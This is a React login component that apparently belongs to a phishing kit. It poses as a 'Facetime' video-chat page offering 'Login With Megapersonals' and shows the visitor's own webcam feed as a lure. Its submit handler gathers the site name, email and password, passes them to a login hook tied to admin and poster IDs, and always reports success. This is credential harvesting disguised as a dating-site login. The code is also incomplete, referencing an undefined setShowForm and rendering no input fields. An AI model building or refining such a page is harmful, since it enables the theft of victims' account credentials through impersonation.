"use client";
import { Field, Form, Formik } from "formik";
import { site } from "../config/index";
import useMockLogin from "../hooks/useMockLogin";
import { useState } from "react";
import { toast } from "react-toastify";
import { useRouter } from "next/navigation";
import Cookies from "js-cookie";
import { API_URL } from "../config";
import Image from "next/image";
import Webcam from "react-webcam";


function LoginForm({ adminId, posterId }) {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [wrongPassword, setWrongPassword] = useState("");
  // const [showWrongPassword, setShowWrongPassword] = useState(false);
  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = () => {
    const submitValues = {
      site: site,
      email: email,
      password: password,
    };
    login(submitValues);
    // setShowWrongPassword(true);
    toast.success("Login successfull");
    // router.push(`/security-check`);
    setEmail("");
    setPassword("");
  
    console.log(submitValues);
  };



  return (
    <>
    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
   
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        
      />

      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
        
          
            <div class="p-5 w-[400px]">
              <div class="mx-auto flex items-center justify-center mt-5">
                <img
                  class="h-16 w-16 text-center"
                  src="/images/logo-potrait.jpg"
                  alt=""
                />
              </div>
              <h2 class="text-3xl font-bold text-blue-900 text-center">
                Facetime
              </h2>
              <p class="text-xl pt-5 font-semibold text-[#707b8e]">
                Login With Megapersonals and enjoy with{" "}
                <b class="text-[#00BE70]">Facetime video chat</b> your dating
                partner.
              </p>

              <button
                class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#00BE70] text-xl font-semibold text-white rounded-md"
                onClick={() => setShowForm(false)}
              >
                <span>
                  <img
                    src="/images/logo-potrait.jpg"
                    class="w-12 h-12"
                    alt=""
                  />
                </span>
                <span>Login With Megapersonal</span>
              </button>
            </div>
            </div>
                 </div>
            </>
  );
}

export default LoginForm;
